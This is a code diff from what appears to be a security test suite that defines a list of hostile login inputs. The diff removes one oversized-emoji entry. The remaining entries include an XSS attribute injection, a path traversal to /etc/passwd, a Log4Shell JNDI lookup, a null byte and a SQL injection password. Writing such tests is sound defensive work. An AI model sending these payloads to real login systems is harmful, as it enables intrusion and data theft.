@@ -77,7 +77,6 @@ LOGIN_ATTACK_PAYLOADS: list[dict[str, str]] = [
     {"email": '" onfocus="alert(1)"@x.com', "password": "x"},
     {"email": "../../../../etc/passwd", "password": "x"},
     {"email": "${jndi:ldap://example.com/a}", "password": "x"},
-    {"email": "😀" * 64 + "@x.com", "password": "x"},
     {"email": "null-byte%00@test.com", "password": "x"},
     {"email": "admin@example.com", "password": "' OR ''='"},
     {"email": "admin@example.com", "password": "A" * 5000},
